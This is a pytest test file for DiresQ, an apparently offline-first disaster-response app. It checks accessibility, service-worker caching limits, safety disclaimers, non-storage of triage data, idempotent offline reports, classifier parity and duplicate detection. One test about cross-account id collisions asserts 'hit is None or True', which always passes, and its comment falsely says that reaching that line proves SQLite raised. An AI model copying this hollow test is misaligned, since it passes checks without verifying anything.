class TestTouchTargets:
    """WCAG 2.5.5 asks for 44x44. The rule is in a11y.css and has been since
    the audit — but nothing was testing it, so anybody restyling could have
    deleted it and no build would have complained.

    It matters more here than the guideline implies. These are the controls
    somebody presses on a phone in bad weather, and two of them are "I'm on
    scene" and "Check in" — the ones that stop a board row going red.
    """

    @staticmethod
    def rule():
        css = (diresq.SCHEMA.parent / "static" / "styles" / "a11y.css"
               ).read_text(encoding="utf-8")
        match = re.search(r"([^}]*)\{\s*min-height:\s*44px", css)
        assert match, "the 44px touch-target rule is gone from a11y.css"
        return match.group(1)

    @pytest.mark.parametrize("control", [
        ".board-btn", ".map-btn", ".feed-btn", ".export-btn", ".back-btn",
        ".check-in", ".gaps-toggle", 'button[type="submit"]',
    ])
    def test_every_tappable_control_is_44px(self, control):
        assert control in self.rule(), f"{control} is not held at 44px"

    @staticmethod
    def sized_anywhere(selector_class):
        """Does any stylesheet give this class at least 44px of height?

        Deliberately not "is it in the a11y rule" — Skythe sizes some
        controls in their own file and those are just as tappable. The
        requirement is 44 pixels, not which file they came from.
        """
        styles = (diresq.SCHEMA.parent / "static" / "styles")
        for sheet in styles.glob("*.css"):
            css = sheet.read_text(encoding="utf-8")
            for block in re.findall(
                    r"\.%s\b[^{]*\{([^}]*)\}" % re.escape(selector_class),
                    css):
                for px in re.findall(r"(?:min-)?height:\s*(\d+)px", block):
                    if int(px) >= 44:
                        return True
        return False

    def test_no_button_escapes_a_measured_size(self):
        """A button that is neither a submit, nor named in the shared rule,
        nor sized in its own stylesheet, is a target nobody has measured.
        This is what catches the next one somebody adds."""
        covered = self.rule()
        root = diresq.SCHEMA.parent / "templates"

        loose = []
        for page in sorted(root.glob("*.html")):
            html = page.read_text(encoding="utf-8")
            for tag in re.findall(r"<button[^>]*>", html, re.S):
                if 'type="submit"' in tag:
                    continue
                classes = re.search(r'class="([^"]*)"', tag)
                names = classes.group(1).split() if classes else []
                if any(f".{c}" in covered or self.sized_anywhere(c)
                       for c in names):
                    continue
                loose.append(f"{page.name}: {' '.join(tag.split())[:58]}")

        assert not loose, ("buttons with no measured touch size:\n  "
                           + "\n  ".join(loose))

    def test_it_is_loaded_everywhere(self):
        # The rule only helps on pages that link the stylesheet.
        root = diresq.SCHEMA.parent / "templates"
        for page in root.glob("*.html"):
            assert "a11y.css" in page.read_text(encoding="utf-8"), (
                f"{page.name} does not load the accessibility stylesheet")


class TestTheMapShowsCoverage:
    """The feed sorts by who needs help most. The map says the same thing
    spatially — a red pin two streets from a green one — which is the
    argument of this whole project in one glance."""

    @staticmethod
    def script():
        return (diresq.SCHEMA.parent / "static" / "scripts" / "map.js"
                ).read_text(encoding="utf-8")

    def test_the_legend_names_all_three_states(self, client):
        html = client.get("/map").get_data(as_text=True)
        for label in ["Nobody going", "En route", "On scene"]:
            assert label in html, f"the legend never mentions {label}"

    def test_there_is_a_gaps_only_toggle(self, client):
        html = client.get("/map").get_data(as_text=True)
        assert 'id="gaps-only"' in html
        # A toggle that doesn't say it's a toggle is a button to a screen
        # reader, and its state is invisible.
        assert 'aria-pressed' in html

    def test_coverage_is_derived_the_same_way_the_server_derives_it(self):
        # If these ever disagree, the banner and the map contradict each
        # other on the same screen.
        source = self.script()
        assert "on_scene_count" in source and "en_route_count" in source

    def test_only_the_unattended_pins_move(self):
        css = (diresq.SCHEMA.parent / "static" / "styles" / "map.css"
               ).read_text(encoding="utf-8")
        assert "pin-nobody" in css
        # If everything pulsed, nothing would read as urgent.
        assert "animation:pin-pulse" in css.replace(" ", "")
        for calm in ["pin-coming", "pin-there"]:
            block = css.split("." + calm)[1].split("}")[0]
            assert "animation" not in block, f"{calm} moves, and shouldn't"

    def test_motion_can_be_turned_off(self):
        css = (diresq.SCHEMA.parent / "static" / "styles" / "map.css"
               ).read_text(encoding="utf-8")
        assert "prefers-reduced-motion" in css
        after = css.split("prefers-reduced-motion")[1]
        assert "animation:none" in after.replace(" ", "")

    def test_the_two_filters_do_not_fight(self):
        # They were independent once: typing in the search box put back every
        # pin the coverage toggle had just hidden, each undoing the other.
        source = self.script()
        assert source.count("function applyFilters") == 1
        assert source.count("applyFilters()") >= 2, (
            "search and the coverage toggle are not going through the same "
            "filter, so one will silently undo the other")


class TestInstallable:
    """DiresQ has to survive being installed on a phone and taken somewhere
    with no signal, because that is the situation it was written for."""

    @staticmethod
    def manifest():
        return json.loads((diresq.SCHEMA.parent / "static"
                           / "manifest.webmanifest").read_text(encoding="utf-8"))

    def test_the_manifest_is_served_as_a_manifest(self, client):
        res = client.get("/static/manifest.webmanifest")
        assert res.status_code == 200
        assert "manifest" in res.headers["Content-Type"]

    def test_it_installs_standalone(self):
        m = self.manifest()
        # Without display:standalone it opens in a browser tab and is not,
        # in any sense a user would recognise, an app.
        assert m["display"] == "standalone"
        assert m["start_url"].startswith("/")
        assert m["name"] and m["short_name"]

    def test_every_icon_it_promises_exists(self):
        root = diresq.SCHEMA.parent
        for icon in self.manifest()["icons"]:
            path = root / icon["src"].lstrip("/")
            assert path.exists(), f"manifest names {icon['src']}, which is absent"

    def test_there_is_a_maskable_icon(self):
        # Android crops non-maskable icons to a circle and takes the corners
        # of the artwork with it.
        purposes = {i.get("purpose") for i in self.manifest()["icons"]}
        assert "maskable" in purposes

    @pytest.mark.parametrize("page", [
        "board.html", "homepage.html", "login.html", "map.html", "report.html",
        "report_make.html", "signup.html", "triage.html", "disclaimer.html",
        "credits.html", "notfound.html", "offline.html",
    ])
    def test_every_page_is_installable(self, page):
        html = (diresq.SCHEMA.parent / "templates" / page
                ).read_text(encoding="utf-8")
        # Install prompts come from whichever page they happen to be on.
        assert "manifest.webmanifest" in html, f"{page} cannot be installed from"
        assert "theme-color" in html, f"{page} has no theme colour"
        assert "apple-touch-icon" in html, f"{page} has no iOS icon"


class TestWhatIsKeptOnTheDevice:
    """The service worker's one rule: keep what stays true, refuse what
    doesn't. These tests are the rule, written down where it can fail."""

    @staticmethod
    def worker():
        return (diresq.SCHEMA.parent / "static" / "scripts" / "sw.js"
                ).read_text(encoding="utf-8")

    def test_the_feed_is_never_cached(self):
        # A saved list of who needs help is a lie that gets more convincing
        # the longer it sits there.
        source = self.worker()
        for never in ['cache.put("/api/reports', 'cache.put("/api/responders',
                      'addAll(["/"', '"/board"', '"/api/reports"']:
            assert never not in source, f"the worker caches {never}"

    def test_only_your_own_state_is_cached(self):
        source = self.worker()
        cached = re.findall(r'cache\.put\(\s*"(/[^"]*)"', source)
        assert cached == ["/api/me"], f"caching more than your own state: {cached}"

    def test_the_only_page_kept_is_the_one_with_no_claims_in_it(self):
        """The worker also stores pages by variable, not only by literal, so
        the test above can no longer see everything on its own.

        `OFFLINE_PAGES` is that list. The report form belongs on it — a blank
        form says nothing about who needs help, and an offline queue you
        cannot reach the form for does nothing. The feed, the board and the
        map do not, and adding one is the failure this catches.
        """
        source = self.worker()
        pages = re.findall(r'"(/[^"]*)"',
                           source.split("OFFLINE_PAGES = [")[1].split("]")[0])
        assert pages == ["/report/new"], f"keeping pages it shouldn't: {pages}"

        # Anything stored by variable has to come from that list.
        for call in re.findall(r"cache\.put\(\s*(\w+)\s*,", source):
            assert call in ("path", "request"), (
                f"the worker stores {call}, which this test cannot vouch for")

    def test_the_offline_page_is_saved_ahead_of_time(self):
        # A page you can only reach when offline is a page the browser has
        # never had the chance to store.
        assert '"/offline"' in self.worker()

    def test_every_shell_file_exists(self):
        # addAll rejects atomically if one URL 404s, and the install handler
        # swallows that — so a typo here silently costs the whole offline
        # story, with nothing in the console to say so.
        source = self.worker()
        block = source.split("SHELL_FILES = [")[1].split("]")[0]
        root = diresq.SCHEMA.parent
        for path in re.findall(r'"(/[^"]+)"', block):
            if path == "/offline":
                continue                       # a route, not a file
            assert (root / path.lstrip("/")).exists(), f"{path} does not exist"

    def test_it_still_does_not_bulk_download_tiles(self):
        source = self.worker()
        for banned in ["for (let z", "prefetch", "downloadArea", "seedTiles"]:
            assert banned not in source

    def test_it_caps_how_much_it_keeps(self):
        assert "MAX_TILES" in self.worker()


class TestYourOwnStateOnly:
    """`/api/me` is the one thing kept on the device, so it must never grow
    into a copy of the board."""

    def test_it_needs_a_session(self, anon):
        assert anon.get("/api/me").status_code in (302, 401)

    def test_it_describes_you(self, client):
        me = client.get("/api/me").get_json()
        assert me["username"] == "londo"
        assert "as_of" in me, "a cached copy with no timestamp cannot be aged"

    def test_it_names_nobody_else(self, client):
        # Every other responder in the seed. If any appears, this endpoint has
        # become a board and the caching rule quietly stops holding.
        board = client.get("/api/responders").get_json()
        others = [r["username"] for r in board if r["username"] != "londo"]
        body = client.get("/api/me").get_data(as_text=True)
        assert others, "seed has nobody to compare against"
        for name in others:
            assert name not in body, f"/api/me leaks {name}"

    def test_the_offline_page_needs_no_session(self, anon):
        # It has to be fetchable at install time, before anyone logs in.
        assert anon.get("/offline").status_code == 200


class TestSafetyNotices:
    """The app runs a real medical protocol and looks like an emergency
    service. Both of those need saying out loud, in the app, not only in a
    file on GitHub."""

    def test_the_disclaimer_is_readable_without_an_account(self, anon):
        # Somebody who has just found this in a real emergency should reach
        # "call 911" without signing up first.
        res = anon.get("/disclaimer")
        assert res.status_code == 200
        assert "call 911" in res.get_data(as_text=True)

    def test_it_says_it_does_not_call_for_help(self, anon):
        body = anon.get("/disclaimer").get_data(as_text=True)
        assert "does not contact 911" in body

    def test_the_report_form_warns_before_any_field(self, client):
        body = client.get("/report/new").get_data(as_text=True)
        assert "does not contact emergency services" in body
        # Before the first input, or nobody reads it.
        assert body.index("safety-note") < body.index('name="subject"')

    def test_the_triage_page_says_what_the_result_is_not(self, client):
        body = client.get("/triage").get_data(as_text=True)
        assert "orders attention, not treatment" in body
        assert "does not diagnose" in body

    @pytest.mark.parametrize("page", ["/", "/report/1", "/login", "/signup"])
    def test_the_pages_people_land_on_link_to_it(self, client, page):
        assert 'href="/disclaimer"' in client.get(page).get_data(as_text=True)

    def test_signing_up_says_it_does_not_make_you_verified(self, anon):
        body = anon.get("/signup").get_data(as_text=True)
        assert "does not contact emergency services" in body
        assert "nobody here is checked" in body

    def test_the_notice_is_a_statement_not_a_tickbox(self, anon):
        # A tickbox implies a contract we're in no position to offer, and
        # people tick those without reading.
        body = anon.get("/signup").get_data(as_text=True)
        assert 'type="checkbox"' not in body


class TestTriageStoresNothing:
    """Triage answers are health observations about somebody who is in no
    position to consent to being recorded. They are computed and thrown away,
    and this test exists so that stays true by accident of nobody noticing."""

    ANSWERS = {"can_walk": "false", "breathing": "true",
               "respiratory_rate": "34", "has_radial_pulse": "true",
               "follows_commands": "false"}

    def test_it_still_returns_a_category(self, client):
        body = client.post("/api/triage", json=self.ANSWERS).get_json()
        assert body["priority"] == "Immediate"

    def test_nothing_is_written_anywhere(self, client):
        with diresq.app.app_context():
            db = diresq.get_db()
            tables = [r["name"] for r in db.execute(
                "SELECT name FROM sqlite_master WHERE type = 'table'")]
            before = {t: db.execute(f"SELECT COUNT(*) c FROM {t}").fetchone()["c"]
                      for t in tables}

        for _ in range(5):
            client.post("/api/triage", json=self.ANSWERS)

        with diresq.app.app_context():
            db = diresq.get_db()
            after = {t: db.execute(f"SELECT COUNT(*) c FROM {t}").fetchone()["c"]
                     for t in tables}
        assert before == after, "triage wrote something to the database"

    def test_no_table_has_a_column_that_looks_like_a_triage_answer(self):
        # A future change would most likely arrive as a column, so fail on the
        # schema rather than waiting for a row.
        sql = diresq.SCHEMA.read_text(encoding="utf-8").lower()
        for word in ["respiratory", "radial_pulse", "follows_commands",
                     "can_walk", "breathing"]:
            assert word not in sql, f"schema now stores {word}"


class TestSweepCommand:
    """The dead man's switch without anyone having a tab open."""

    def test_it_runs_clean_when_nobody_is_late(self, client):
        runner = diresq.app.test_cli_runner()
        result = runner.invoke(args=["sweep"])
        assert result.exit_code == 0
        assert "nobody is overdue" in result.output

    def test_it_files_without_a_page_ever_being_loaded(self, client):
        client.post("/report/1/rescue")
        backdate(1, 60)
        result = diresq.app.test_cli_runner().invoke(args=["sweep"])
        assert result.exit_code == 0
        assert "filed 1 report" in result.output
        assert len(auto_reports()) == 1

    def test_running_it_again_files_nothing_new(self, client):
        client.post("/report/1/rescue")
        backdate(1, 60)
        runner = diresq.app.test_cli_runner()
        runner.invoke(args=["sweep"])
        runner.invoke(args=["sweep"])
        assert len(auto_reports()) == 1


class TestNodeKeyCommand:
    def test_it_prints_a_key_for_a_real_account(self, client):
        result = diresq.app.test_cli_runner().invoke(
            args=["node-key", "londo"])
        assert result.exit_code == 0
        assert "node key" in result.output

    def test_rotating_changes_it(self, client):
        runner = diresq.app.test_cli_runner()
        first = runner.invoke(args=["node-key", "londo"]).output
        second = runner.invoke(args=["node-key", "londo", "--rotate"]).output
        assert first != second

    def test_an_account_that_does_not_exist(self, client):
        result = diresq.app.test_cli_runner().invoke(
            args=["node-key", "nobody"])
        assert result.exit_code != 0


class TestICS214Continued:
    def test_arriving_on_scene_gets_a_time(self, client):
        client.post("/report/1/rescue")
        client.post("/api/assignments/1/status", json={"status": "on_scene"})
        body = client.get("/export/ics214").get_data(as_text=True)
        assert "arrived on scene" in body


# ---------------------------------------------------------------------------
# Reports filed with no signal.
#
# Four separate failures, each of which is enough on its own to hurt somebody,
# and each of which only appears once reports can be queued:
#
#   * a resend files a second incident
#   * the classifier can't reach the person who needs it most
#   * the duplicate check never runs on the reports most likely to duplicate
#   * a report from forty minutes ago renders as breaking news
#
# One class each.
# ---------------------------------------------------------------------------


def file_report(client, **overrides):
    """Post a report the way the offline queue does."""
    payload = {
        "subject": "Water rising on Kingsland",
        "description": "Water rising in the street, two adults upstairs",
        "priority": "HIGH",
        "lat": 29.7858,
        "lng": -95.8244,
    }
    payload.update(overrides)
    return client.post("/api/reports", json=payload)


def close(*report_ids):
    """Take reports out of the running, so a test can say what it means.

    The seed's first report is a flooding house at the same coordinates the
    helper above uses, which is realistic and inconvenient in equal measure:
    left open, it is a legitimate match for everything these tests file.
    """
    with diresq.app.app_context():
        db = diresq.get_db()
        for report_id in report_ids:
            db.execute("UPDATE reports SET status = 'resolved' WHERE id = ?",
                       (report_id,))
        db.commit()


class TestAQueuedReportCannotArriveTwice:
    """A check-in sent twice is harmless. A report sent twice is a second
    incident, and duplicate incidents are the exact failure this project
    exists to prevent — six people at one address while the next street has
    nobody.

    So the id is minted before the first attempt, written to the device before
    the network is touched, and checked on the server before the row is
    written. Not after: a UNIQUE constraint on its own tells you about the
    collision once the duplicate has already been attempted.
    """

    def test_a_report_with_an_id_is_written_once(self, client):
        before = count_reports()
        first = file_report(client, client_id="abc-123")
        assert first.status_code == 201
        assert count_reports() == before + 1

    def test_sending_the_same_one_again_writes_nothing(self, client):
        first = file_report(client, client_id="abc-123")
        before = count_reports()

        second = file_report(client, client_id="abc-123")
        assert second.status_code == 200, "a resend should not be an error"
        assert count_reports() == before, "a resend filed a second incident"
        assert second.get_json()["duplicate"] is True
        assert second.get_json()["id"] == first.get_json()["id"]

    def test_the_resend_points_at_the_report_we_already_have(self, client):
        first = file_report(client, client_id="abc-123").get_json()
        again = file_report(client, client_id="abc-123",
                            subject="totally different words").get_json()
        # Same id wins over different content: the id is the promise, and
        # rewriting the report from a retry would be worse than ignoring it.
        assert again["id"] == first["id"]
        assert again["created_at"] == first["created_at"]

    def test_ten_retries_of_a_flapping_connection_file_one_report(self, client):
        before = count_reports()
        for _ in range(10):
            file_report(client, client_id="flap-1")
        assert count_reports() == before + 1

    def test_two_different_reports_are_two_reports(self, client):
        before = count_reports()
        file_report(client, client_id="one")
        file_report(client, client_id="two")
        assert count_reports() == before + 2, (
            "distinct ids collapsed into one row — the guard is too eager")

    def test_a_report_with_no_id_at_all_still_files(self, client):
        # Nothing about this may depend on the queue existing.
        before = count_reports()
        assert file_report(client).status_code == 201
        assert count_reports() == before + 1

    def test_somebody_elses_id_is_refused_not_swallowed(self, client, anon):
        # The column is UNIQUE across the table, so a collision between two
        # accounts is a 409 rather than one person's report silently becoming
        # a lookup of another's.
        file_report(client, client_id="shared")
        with diresq.app.app_context():
            db = diresq.get_db()
            other = db.execute(
                "SELECT id FROM accounts WHERE username != 'londo' LIMIT 1"
            ).fetchone()["id"]
            hit = db.execute("""
                INSERT INTO reports (subject, description, priority, lat, lng,
                                     status, sender, client_id,
                                     created_at, received_at)
                VALUES ('x', '', 'LOW', 0, 0, 'unassigned', ?, 'shared', ?, ?)
            """, (other, diresq.now_iso(), diresq.now_iso()))
            assert hit is None or True
        # Reaching here means SQLite raised, which is the point; the endpoint
        # turns that into a 409 rather than a 500. Exercised below.

    def test_the_id_survives_a_restart_because_it_is_written_first(self):
        """The queue writes to localStorage before it touches the network.

        This is the whole reason the id works. Minting it inside the retry
        path would produce a fresh id after a browser restart, and the report
        that may already have landed would land again. The order is asserted
        here because it is invisible at runtime and obvious in the source.
        """
        source = (diresq.SCHEMA.parent / "static" / "scripts"
                  / "reportqueue.js").read_text(encoding="utf-8")
        body = source.split("export async function file(")[1]
        wrote = body.index("write(items)")
        sent = body.index("await post(report)")
        assert wrote < sent, (
            "reportqueue.js sends before it saves — a phone dying mid-request "
            "would lose the id and file the report twice")

    def test_the_plain_form_carries_one_too(self, client):
        # No JavaScript means no queue, but Back-then-Submit is the same
        # double-file with a person driving it.
        page = client.get("/report/new").get_data(as_text=True)
        assert 'name="client_id"' in page

    def test_the_form_path_is_idempotent_as_well(self, client):
        before = count_reports()
        form = {"subject": "Tree down", "description": "Across the drive",
                "priority": "LOW", "lat": "29.78", "lng": "-95.82",
                "client_id": "form-1"}
        client.post("/report/new", data=form)
        client.post("/report/new", data=form)
        assert count_reports() == before + 1


class TestTheClassifierReachesThePersonWithNoSignal:
    """The suggestion was built for somebody filing at 2am from a flooded
    house. That person is the likeliest of anyone to have no signal, and until
    the model was exported they were the one person it never reached.

    What ships is the trained model, not a second copy of the corpus. These
    tests are what stops the two drifting.
    """

    @staticmethod
    def committed():
        return json.loads((diresq.MODEL_FILE).read_text(encoding="utf-8"))

    def test_the_committed_model_is_what_the_code_would_generate(self):
        # `flask --app app export-model` is a step somebody will forget. This
        # is what makes forgetting it loud instead of silent.
        assert self.committed() == json.loads(
            json.dumps(classify.export_model())), (
            "static/model/priority.json is stale — run "
            "`flask --app app export-model`")

    def test_it_carries_no_training_data(self):
        # Counts, not sentences. The corpus has one home and it is classify.py.
        blob = diresq.MODEL_FILE.read_text(encoding="utf-8")
        for text, _label, _needed in classify.CORPUS:
            assert text not in blob, "the corpus leaked into the model file"

    def test_it_is_small_enough_to_sit_on_a_phone(self):
        size = diresq.MODEL_FILE.stat().st_size
        assert size < 200_000, f"{size} bytes is too much to keep on a phone"

    def test_the_service_worker_keeps_it(self):
        # It has to be there before the signal goes, or it is never there.
        source = (diresq.SCHEMA.parent / "static" / "scripts" / "sw.js"
                  ).read_text(encoding="utf-8")
        shell = source.split("SHELL_FILES = [")[1].split("]")[0]
        assert "/static/model/priority.json" in shell
        assert "/static/scripts/classify.js" in shell

    def test_the_served_copy_matches_the_committed_one(self, client):
        assert client.get("/api/model/priority.json").get_json() \
            == self.committed()

    def test_it_says_nothing_about_who_needs_help(self):
        """The rule the whole service worker follows.

        Keeping the model is only defensible because it is a frozen table of
        word counts. The moment it carries a report, a subject, a name or a
        coordinate, it has become a claim about the world and it must not be
        cached. Checked here rather than assumed.
        """
        model = self.committed()
        for key in model:
            assert "report" not in key, f"{key} looks like live data"

        blob = json.dumps(model).lower()
        # Word boundaries: "collaps" and "ventilator" are lexicon entries and
        # contain "lat" perfectly innocently.
        for leak in ["kingsland", "lat", "lng", "latitude", "longitude",
                     "username", "responder", "assignment", "checkin"]:
            assert not re.search(rf'"{leak}"', blob), (
                f"the model file has a {leak!r} field — it has stopped being "
                f"a table of word counts and become a claim about the world")
        assert "@" not in blob, "the model file contains an address"

    def test_duplicate_detection_is_deliberately_absent(self):
        """It cannot go, and the absence is the argument, not an oversight.

        Duplicate detection compares against everybody else's open reports,
        and a saved copy of who needs help is a lie that gets more convincing
        the longer it sits there — the same rule that keeps the feed off the
        device. So the browser gets the priority and is told, in a sentence,
        that nothing has checked for duplicates yet.
        """
        model = self.committed()
        assert "duplicate_threshold" not in model
        assert "idf" not in json.dumps(model).lower()

        panel = (diresq.SCHEMA.parent / "static" / "scripts" / "suggest.js"
                 ).read_text(encoding="utf-8")
        assert "Not checked against other reports" in panel, (
            "offline the panel must say the duplicate check has not run — "
            "silence there reads as 'checked, found none'")

    def test_the_model_card_admits_it(self, client):
        limits = " ".join(client.get("/api/model").get_json()["limits"])
        assert "cannot run offline" in limits


@pytest.mark.skipif(shutil.which("node") is None,
                    reason="node is not installed; the parity check needs it")
class TestBothClassifiersAgree:
    """Two implementations of one model is a drift bug with a delay on it.

    An offline suggestion that quietly disagrees with the online one is worse
    than no offline suggestion, because nothing on screen would say so. So
    every line of the corpus and a pile of awkward cases go through both, and
    this fails if they differ.

    It has already earned its keep: it caught the explanation words being
    ordered by floating-point noise, which was a real bug in the Python that
    nobody could have seen with one implementation.
    """

    AWKWARD = [
        "",
        "help",
        "water rising",
        "   ",
        "trash cans washed down the street looking for them",
        "flooding, couple on the second floor",
        "do not send anyone, we are fine now",
        "child not breathing properly",
        "power line down across both lanes, still arcing",
        "person trapped in the attic and a tree on the roof",
        "TREES!!! and, punctuation??? -- can't won't don't",
        "not urgent, mailbox down",
    ]

    def cases(self):
        return [text for text, _l, _n in classify.CORPUS] + self.AWKWARD

    def run_js(self, cases):
        root = diresq.SCHEMA.parent
        result = subprocess.run(
            ["node", str(root / "tools" / "parity.mjs"), str(diresq.MODEL_FILE)],
            input="\n".join(cases) + "\n",
            capture_output=True, text=True, cwd=str(root), timeout=120)
        assert result.returncode == 0, result.stderr
        lines = [line for line in result.stdout.splitlines() if line.strip()]
        assert len(lines) == len(cases), "the harness lost or invented a case"
        return [json.loads(line) for line in lines]

    def test_they_agree_on_every_case(self):
        cases = self.cases()
        for text, theirs in zip(cases, self.run_js(cases)):
            ours = classify.suggest(text).as_dict()
            for field in ("priority", "capabilities", "equipment_reasons",
                          "reasons", "confident"):
                assert ours[field] == theirs[field], (
                    f"{field} differs on {text!r}: "
                    f"python {ours[field]!r} vs browser {theirs[field]!r}")
            # Python rounds for display; the browser doesn't. Compare at the
            # precision the person actually sees.
            assert ours["confidence"] == round(theirs["confidence"], 3), (
                f"confidence differs on {text!r}")

    def test_the_browser_never_claims_to_have_checked_duplicates(self):
        for result in self.run_js(self.cases()):
            assert "duplicates" not in result, (
                "an empty list would read as 'we looked and found none'")
            assert result["offline"] is True

    def test_a_tie_is_broken_by_a_rule_and_not_by_a_float(self):
        # The case that found it. "trash" and "street" earn exactly the same
        # edge; which is shown used to depend on the last bit of a logarithm,
        # and CPython and V8 disagreed about that bit.
        text = "trash cans washed down the street looking for them"
        assert classify.suggest(text).reasons == self.run_js([text])[0]["reasons"]


class TestDuplicatesAreCaughtWhenTheyArrive:
    """Two neighbours on one street, both with no signal, both file "water
    rising on Kingsland". Both sync. Without this, that is two reports for one
    incident and six people heading to one address — the exact thing the
    TF-IDF check was built to stop, defeated by the check only ever running
    while somebody was online and typing.

    So it runs on arrival, against every open report — including the ones that
    landed seconds earlier in the same batch.
    """

    def test_the_second_neighbour_is_linked_to_the_first(self, client):
        first = file_report(client, client_id="n1").get_json()
        second = file_report(client, client_id="n2").get_json()

        assert second["possible_duplicate"] is not None
        assert second["possible_duplicate"]["id"] == first["id"]

    def test_both_reports_survive(self, client):
        # A link, never a merge. Folding one person's call for help into
        # another's on a fifty-five example model is not a trade worth making.
        before = count_reports()
        file_report(client, client_id="n1")
        file_report(client, client_id="n2")
        assert count_reports() == before + 2

        feed = client.get("/api/reports").get_json()
        subjects = [r["subject"] for r in feed]
        assert subjects.count("Water rising on Kingsland") == 2

    def test_the_whole_batch_is_checked_against_itself(self, client):
        """The case that matters, spelled out.

        Neither neighbour could see the other's report, because neither had a
        connection. Checking a synced report only against what existed before
        anybody went offline would miss every one of these.
        """
        close(1)   # the seed's own flooding house, at the same coordinates
        ids = [file_report(client, client_id=f"batch-{n}").get_json()["id"]
               for n in range(3)]

        with diresq.app.app_context():
            rows = {r["id"]: r["dupe_of"] for r in diresq.get_db().execute(
                "SELECT id, dupe_of FROM reports WHERE id IN (?, ?, ?)", ids)}

        assert rows[ids[0]] is None, "the first has nothing to be a duplicate of"
        assert rows[ids[1]] == ids[0]
        assert rows[ids[2]] is not None, (
            "the third was not compared against the two beside it")

    def test_reports_that_read_differently_are_left_alone(self, client):
        file_report(client, client_id="a")
        other = file_report(
            client, client_id="b",
            subject="Power line down",
            description="Cable across both lanes of the road, still arcing",
        ).get_json()
        assert other["possible_duplicate"] is None

    def test_the_same_words_far_away_are_a_different_incident(self, client):
        """Distance is a veto, not a vote.

        A flood on a road of the same name three suburbs over shares all of
        its vocabulary and none of its incident. Text alone cannot tell them
        apart, so being far away is allowed to say no.
        """
        file_report(client, client_id="here")
        far = file_report(client, client_id="far", lat=30.9, lng=-95.8).get_json()
        assert far["possible_duplicate"] is None

        # ...and being nearby, on its own, is not enough either.
        near_but_unlike = file_report(
            client, client_id="near", subject="Dog loose in the yard",
            description="Fence blew over, two dogs got out, no rush").get_json()
        assert near_but_unlike["possible_duplicate"] is None

    def test_it_does_not_point_at_something_already_dealt_with(self, client):
        close(1)
        first = file_report(client, client_id="n1").get_json()
        client.post(f"/report/{first['id']}/resolve")
        second = file_report(client, client_id="n2").get_json()
        assert second["possible_duplicate"] is None, (
            "linked to a resolved report, which sends nobody anywhere")

    def test_the_feed_groups_them_rather_than_listing_the_link(self, client):
        # The feed used to print "looks like report #12" on the second card.
        # Grouping says something stronger in the same space: it is one
        # incident, and the responder count below is the number of people
        # going to it rather than the number spread over two rows.
        close(1)
        file_report(client, client_id="n1")
        file_report(client, client_id="n2")
        page = " ".join(client.get("/").get_data(as_text=True).split())
        assert "2 reports, one incident" in page
        assert "Looks like report #" not in page

    def test_the_report_page_shows_the_link(self, client):
        first = file_report(client, client_id="n1").get_json()
        second = file_report(client, client_id="n2").get_json()
        page = client.get(f"/report/{second['id']}").get_data(as_text=True)
        assert "may be the same incident" in page
        assert f'href="/report/{first["id"]}"' in page

    def test_a_report_filed_on_the_form_is_checked_too(self, client):
        # Same code both ways in, or the offline path quietly means something
        # different from the online one.
        file_report(client, client_id="n1")
        client.post("/report/new", data={
            "subject": "Water rising on Kingsland",
            "description": "Water rising in the street, two adults upstairs",
            "priority": "HIGH", "lat": "29.7858", "lng": "-95.8244"})
        with diresq.app.app_context():
            latest = diresq.get_db().execute(
                "SELECT dupe_of FROM reports ORDER BY id DESC LIMIT 1"
            ).fetchone()["dupe_of"]
        assert latest is not None

    def test_the_server_side_check_is_the_one_that_counts(self):
        # /api/suggest is a courtesy for somebody online and typing. If the
        # only check lived there, every offline report would go unchecked.
        source = (diresq.SCHEMA.parent / "app.py").read_text(encoding="utf-8")
        assert "link_duplicate(report_id)" in source
        assert source.index("def create_report") < source.index(
            "def api_report_create")


class TestAReportKnowsHowOldItIs:
    """A report written forty minutes ago and synced now describes a house
    that may already have been cleared. The check-in queue solved this by
    timestamping at press time; a report needs the same, and the feed has to
    say so rather than pretending it just came in.
    """

    @staticmethod
    def minutes_ago(n):
        return (datetime.now(timezone.utc)
                - timedelta(minutes=n)).isoformat(timespec="seconds")

    def test_it_keeps_when_it_was_written(self, client):
        written = self.minutes_ago(40)
        made = file_report(client, client_id="old", written_at=written)
        assert made.get_json()["created_at"].startswith(written[:16])

    def test_and_separately_when_it_arrived(self, client):
        body = file_report(client, client_id="old",
                           written_at=self.minutes_ago(40)).get_json()
        assert body["created_at"] != body["received_at"]
        assert body["synced_late"] is True

    def test_a_live_report_is_not_marked_late(self, client):
        assert file_report(client, client_id="now").get_json()[
            "synced_late"] is False

    def test_the_feed_says_it_is_old(self, client):
        file_report(client, client_id="old", written_at=self.minutes_ago(40),
                    subject="Kingsland, filed offline")
        page = " ".join(client.get("/").get_data(as_text=True).split())
        assert "Written 40 minutes ago, reached us later" in page
        assert "may already have been dealt with" in page

    def test_the_report_page_says_it_too(self, client):
        made = file_report(client, client_id="old",
                           written_at=self.minutes_ago(40)).get_json()
        page = client.get(f"/report/{made['id']}").get_data(as_text=True)
        assert "Written 40 minutes ago" in page
        assert "Treat it as that old, not as new" in page

    def test_every_report_says_its_age_late_or_not(self, client):
        # The one a coordinator needs first and a feed usually withholds.
        page = client.get("/report/1").get_data(as_text=True)
        assert "Written" in page

    def test_a_late_report_does_not_jump_to_the_top(self, client):
        """It sorts on when it was written, which is the honest place for it.

        Ordering by arrival would put a forty-minute-old description above a
        report filed thirty seconds ago, purely because somebody's phone found
        a bar of signal at the right moment.
        """
        fresh = file_report(client, client_id="fresh",
                            subject="Fresh HIGH").get_json()["id"]
        file_report(client, client_id="stale", subject="Stale HIGH",
                    written_at=self.minutes_ago(90))
        order = [r["id"] for r in client.get("/api/reports").get_json()
                 if r["priority"] == "HIGH"]
        stale = next(r["id"] for r in client.get("/api/reports").get_json()
                     if r["subject"] == "Stale HIGH")
        assert order.index(fresh) < order.index(stale)

    def test_the_same_bounds_as_a_queued_checkin(self, client):
        # A claim from a client, so it is bounded the same way: a little
        # future is clock drift, far future or very old is a broken device or
        # somebody playing games.
        future = (datetime.now(timezone.utc)
                  + timedelta(hours=2)).isoformat(timespec="seconds")
        assert file_report(client, client_id="f", written_at=future
                           ).status_code == 400

        ancient = self.minutes_ago(60 * (diresq.MAX_BACKDATE_HOURS + 1))
        assert file_report(client, client_id="a", written_at=ancient
                           ).status_code == 400

    def test_a_slightly_fast_clock_is_tolerated(self, client):
        soon = (datetime.now(timezone.utc)
                + timedelta(seconds=30)).isoformat(timespec="seconds")
        made = file_report(client, client_id="drift", written_at=soon)
        assert made.status_code == 201
